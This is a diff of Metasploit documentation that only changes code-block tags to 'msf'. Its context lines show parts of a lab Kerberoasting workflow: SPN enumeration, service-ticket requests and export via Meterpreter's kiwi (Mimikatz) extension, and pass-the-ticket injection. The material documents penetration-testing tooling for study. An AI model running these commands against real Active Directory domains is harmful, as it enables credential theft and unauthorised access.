@@ -50,7 +50,7 @@ run rhost=192.168.123.13 user=<username> pass=<password> domain=<domain>
 
 If you followed the lab setup setup above, this should output the following result:
 
-```
+```msf
 msf6 auxiliary(gather/get_user_spns) > run rhost=192.168.123.13 user=Administrator pass=p4$$w0rd domain=adf3.local
 
 [*] Running for 192.168.123.13...
@@ -108,7 +108,7 @@ and cracking the hash.
 First an SPN needs to be found. This can be done in a number of ways - including using metasploit's
 very own `auxiliary/gather/ldap_query` module:
 
-```
+```msf
 msf6 > use auxiliary/gather/ldap_query
 msf6 auxiliary(gather/ldap_query) > set RHOSTS 172.16.199.235
 RHOSTS => 172.16.199.235
@@ -169,7 +169,7 @@ Great, we now have a couple SPNs to move forward with.
 If you have a running Meterpreter session you can request a Service Ticket using the kiwi extension and one of the SPNs
 found above:
 
-```
+```msf
 meterpreter > load kiwi
 Loading extension kiwi...
 
@@ -217,7 +217,7 @@ meterpreter > kerberos_ticket_list
 
 **Export Service Tickets**
 
-```
+```msf
 meterpreter > kiwi_cmd kerberos::list /export
 
 [00000001] - 0x00000017 - rc4_hmac_nt
@@ -399,6 +399,6 @@ escalation is also possible as the user can be added into an elevated group such
 The new ticket can be injected back into the memory with the following Mimikatz command in order to perform
 authentication with the targeted service via Kerberos protocol.
 
-```
+```msf
 meterpreter > kiwi_cmd kerberos::ptt Administrator.kirbi
 ```
